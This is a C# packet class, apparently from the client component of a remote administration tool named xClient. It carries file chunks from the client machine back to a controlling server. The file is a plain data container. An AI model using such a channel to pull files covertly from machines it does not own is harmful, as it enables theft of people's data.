using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class DoDownloadFileResponse : IPacket
    {
        [ProtoMember(1)]
        public int ID { get; set; }

        [ProtoMember(2)]
        public string Filename { get; set; }

        [ProtoMember(3)]
        public byte[] Block { get; set; }

        [ProtoMember(4)]
        public int MaxBlocks { get; set; }

        [ProtoMember(5)]
        public int CurrentBlock { get; set; }

        [ProtoMember(6)]
        public string CustomMessage { get; set; }

        public DoDownloadFileResponse()
        {
        }

        public DoDownloadFileResponse(int id, string filename, byte[] block, int maxblocks, int currentblock,
            string custommessage)
        {
            this.ID = id;
            this.Filename = filename;
            this.Block = block;
            this.MaxBlocks = maxblocks;
            this.CurrentBlock = currentblock;
            this.CustomMessage = custommessage;
        }

        public void Execute(Client client)
        {
            // block thread till send queue is empty to prevent
            // allocation of all blocks at once
            client.SendBlocking(this);
        }
    }
}